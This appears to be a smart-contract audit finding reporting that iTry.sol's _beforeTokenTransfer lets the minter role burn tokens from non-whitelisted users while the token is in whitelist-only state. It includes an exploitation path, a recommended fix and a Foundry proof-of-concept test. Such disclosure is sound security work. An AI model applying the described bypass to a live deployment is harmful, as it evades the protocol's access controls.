## Title
Whitelist Bypass in WHITELIST_ENABLED State Allows Non-Whitelisted Users to Redeem iTRY Tokens via iTryIssuer

## Summary
The `_beforeTokenTransfer` function in iTry.sol fails to enforce whitelist requirements when burning tokens via the MINTER_CONTRACT role in WHITELIST_ENABLED state. This allows non-whitelisted (but non-blacklisted) users to redeem their iTRY tokens through iTryIssuer.redeemFor(), violating Invariant 3 which states that ONLY whitelisted users can burn iTRY in WHITELIST_ENABLED state. [1](#0-0) 

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/iTRY/iTry.sol` (_beforeTokenTransfer function, lines 198-200)

**Intended Logic:** When iTry token is in WHITELIST_ENABLED state (TransferState = 1), Invariant 3 requires that ONLY whitelisted users can send/receive/burn iTRY tokens. The burn operation should verify that the `from` address has the WHITELISTED_ROLE.

**Actual Logic:** The _beforeTokenTransfer function allows burning from any non-blacklisted address when called by MINTER_CONTRACT role, without checking if the `from` address has WHITELISTED_ROLE. [1](#0-0) 

**Exploitation Path:**
1. Protocol sets iTry token to WHITELIST_ENABLED state (TransferState = 1)
2. User has WHITELISTED_USER_ROLE in iTryIssuer (can call redeemFor) but does NOT have WHITELISTED_ROLE in iTry token
3. User cannot transfer their iTRY tokens (correctly blocked by lines 210-216 requiring all parties to be whitelisted)
4. User calls `iTryIssuer.redeemFor(recipient, iTRYAmount, minAmountOut)` to redeem their tokens [2](#0-1) 

5. iTryIssuer calls `_burn(msg.sender, iTRYAmount)` which calls `iTryToken.burnFrom(msg.sender, iTRYAmount)` [3](#0-2) 

6. The _beforeTokenTransfer check at line 199 passes because: msg.sender (iTryIssuer) has MINTER_CONTRACT role, `from` (user) is NOT blacklisted, and `to` is address(0)
7. Tokens are burned successfully, violating the whitelist restriction

**Security Property Broken:** Violates Invariant 3: "In WHITELIST_ENABLED state, ONLY whitelisted users can send/receive/burn iTRY"

## Impact Explanation
- **Affected Assets**: iTRY tokens in WHITELIST_ENABLED state
- **Damage Severity**: Non-whitelisted users can bypass transfer restrictions by redeeming through iTryIssuer instead of transferring, undermining the intended access control mechanism. While the redemption itself is economically neutral (user receives equivalent DLF), it defeats the purpose of WHITELIST_ENABLED state which is meant to restrict ALL token movement to whitelisted parties only.
- **User Impact**: Any user with WHITELISTED_USER_ROLE in iTryIssuer but without WHITELISTED_ROLE in iTry token can bypass the whitelist restriction. This creates an inconsistency where tokens appear "frozen" for transfers but can still exit via redemption.

## Likelihood Explanation
- **Attacker Profile**: Any user who has WHITELISTED_USER_ROLE in iTryIssuer but lacks WHITELISTED_ROLE in iTry token
- **Preconditions**: iTry token must be in WHITELIST_ENABLED state, and there must be a mismatch between iTryIssuer's whitelist and iTry token's whitelist
- **Execution Complexity**: Single transaction - user simply calls `iTryIssuer.redeemFor()`
- **Frequency**: Can be exploited whenever the preconditions exist

## Recommendation

In `src/token/iTRY/iTry.sol`, function `_beforeTokenTransfer`, line 199, add a whitelist check for the `from` address when burning in WHITELIST_ENABLED state:

```solidity
// CURRENT (vulnerable):
// Line 199-200 in iTry.sol
if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
    // redeeming
}

// FIXED:
if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) 
    && hasRole(WHITELISTED_ROLE, from) && to == address(0)) {
    // redeeming - now requires from to be whitelisted in WHITELIST_ENABLED state
}
```

Alternative mitigation: Ensure iTryIssuer's whitelist (_WHITELISTED_USER_ROLE) is always synchronized with iTry token's whitelist (WHITELISTED_ROLE), though this is operationally complex and error-prone.

## Proof of Concept

```solidity
// File: test/Exploit_WhitelistBypass.t.sol
// Run with: forge test --match-test test_WhitelistBypass_NonWhitelistedUserCanRedeem -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/token/iTRY/iTry.sol";
import "../src/protocol/iTryIssuer.sol";
import "../src/external/DLFToken.sol";
import "../src/protocol/RedstoneNAVFeed.sol";

contract Exploit_WhitelistBypass is Test {
    iTry public itryToken;
    iTry public itryImplementation;
    ERC1967Proxy public itryProxy;
    DLFToken public dlfToken;
    RedstoneNAVFeed public oracle;
    iTryIssuer public issuer;
    
    address public admin;
    address public treasury;
    address public custodian;
    address public victim;
    
    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    bytes32 constant WHITELISTED_ROLE = keccak256("WHITELISTED_ROLE");
    
    function setUp() public {
        admin = address(this);
        treasury = makeAddr("treasury");
        custodian = makeAddr("custodian");
        victim = makeAddr("victim");
        
        // Deploy oracle
        oracle = new RedstoneNAVFeed();
        vm.mockCall(
            address(oracle),
            abi.encodeWithSelector(RedstoneNAVFeed.price.selector),
            abi.encode(1e18) // 1:1 NAV
        );
        
        // Deploy DLF token
        dlfToken = new DLFToken(admin);
        
        // Deploy iTry with proxy
        itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            admin
        );
        itryProxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(itryProxy));
        
        // Deploy iTryIssuer
        issuer = new iTryIssuer(
            address(itryToken),
            address(dlfToken),
            address(oracle),
            treasury,
            treasury, // yieldReceiver
            custodian,
            admin,
            0, // initialIssued
            0, // initialDLFUnderCustody
            500, // vaultTargetPercentageBPS
            0 // vaultMinimumBalance
        );
        
        // Grant MINTER_CONTRACT role to issuer
        itryToken.grantRole(MINTER_CONTRACT, address(issuer));
        
        // Whitelist victim in iTryIssuer (can mint/redeem)
        issuer.addToWhitelist(victim);
        
        // DO NOT whitelist victim in iTry token (simulate mismatch)
        // itryToken.addWhitelistAddress(...) is NOT called for victim
        
        // Setup victim with DLF and mint iTRY
        dlfToken.mint(victim, 1000e18);
        vm.startPrank(victim);
        dlfToken.approve(address(issuer), 1000e18);
        issuer.mintITRY(1000e18, 0);
        vm.stopPrank();
        
        // Approve issuer to burn victim's tokens
        vm.prank(victim);
        itryToken.approve(address(issuer), type(uint256).max);
    }
    
    function test_WhitelistBypass_NonWhitelistedUserCanRedeem() public {
        // SETUP: Set iTry token to WHITELIST_ENABLED state
        itryToken.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);
        
        uint256 victimBalanceBefore = itryToken.balanceOf(victim);
        assertGt(victimBalanceBefore, 0, "Victim should have iTRY tokens");
        
        // Verify victim is NOT whitelisted in iTry token
        assertFalse(
            itryToken.hasRole(WHITELISTED_ROLE, victim),
            "Victim should NOT be whitelisted in iTry token"
        );
        
        // Verify victim cannot transfer tokens (correctly blocked)
        address randomReceiver = makeAddr("randomReceiver");
        vm.prank(victim);
        vm.expectRevert(IiTryDefinitions.OperationNotAllowed.selector);
        itryToken.transfer(randomReceiver, 100e18);
        
        // EXPLOIT: Victim can still redeem tokens via iTryIssuer
        vm.prank(victim);
        bool fromBuffer = issuer.redeemFor(victim, victimBalanceBefore, 0);
        
        // VERIFY: Tokens were successfully burned, violating whitelist restriction
        assertEq(
            itryToken.balanceOf(victim),
            0,
            "Vulnerability confirmed: Non-whitelisted user successfully redeemed iTRY in WHITELIST_ENABLED state"
        );
    }
}
```

## Notes

The security question asks specifically about "blacklisted addresses," but the actual vulnerability discovered is the inverse: **non-whitelisted** addresses can bypass restrictions in WHITELIST_ENABLED state. The burn logic at line 199 correctly prevents burning from blacklisted addresses via the `!hasRole(BLACKLISTED_ROLE, from)` check. However, it fails to enforce that `from` must have WHITELISTED_ROLE in WHITELIST_ENABLED state.

This creates a significant inconsistency: the iTryIssuer whitelist (_WHITELISTED_USER_ROLE) and iTry token whitelist (WHITELISTED_ROLE) are separate systems that can become desynchronized, allowing users whitelisted in one but not the other to bypass transfer restrictions through redemption.

The vulnerability is in-scope (iTry.sol), exploitable by unprivileged users, and violates a documented invariant (Invariant 3). It is NOT listed in the known issues from the Zellic audit, which only mentions blacklisted users transferring via allowance, not the whitelist bypass issue.

### Citations

**File:** src/token/iTRY/iTry.sol (L198-200)
```text
        } else if (transferState == TransferState.WHITELIST_ENABLED) {
            if (hasRole(MINTER_CONTRACT, msg.sender) && !hasRole(BLACKLISTED_ROLE, from) && to == address(0)) {
                // redeeming
```

**File:** src/protocol/iTryIssuer.sol (L318-351)
```text
    function redeemFor(address recipient, uint256 iTRYAmount, uint256 minAmountOut)
        public
        onlyRole(_WHITELISTED_USER_ROLE)
        nonReentrant
        returns (bool fromBuffer)
    {
        // Validate recipient address
        if (recipient == address(0)) revert CommonErrors.ZeroAddress();

        // Validate iTRYAmount > 0
        if (iTRYAmount == 0) revert CommonErrors.ZeroAmount();

        if (iTRYAmount > _totalIssuedITry) {
            revert AmountExceedsITryIssuance(iTRYAmount, _totalIssuedITry);
        }

        // Get NAV price from oracle
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate gross DLF amount: iTRYAmount * 1e18 / navPrice
        uint256 grossDlfAmount = iTRYAmount * 1e18 / navPrice;

        if (grossDlfAmount == 0) revert CommonErrors.ZeroAmount();

        uint256 feeAmount = _calculateRedemptionFee(grossDlfAmount);
        uint256 netDlfAmount = grossDlfAmount - feeAmount;

        // Check if output meets minimum requirement
        if (netDlfAmount < minAmountOut) {
            revert OutputBelowMinimum(netDlfAmount, minAmountOut);
        }

        _burn(msg.sender, iTRYAmount);
```

**File:** src/protocol/iTryIssuer.sol (L587-591)
```text
    function _burn(address from, uint256 amount) internal {
        // Burn user's iTRY tokens
        _totalIssuedITry -= amount;
        iTryToken.burnFrom(from, amount);
    }
```
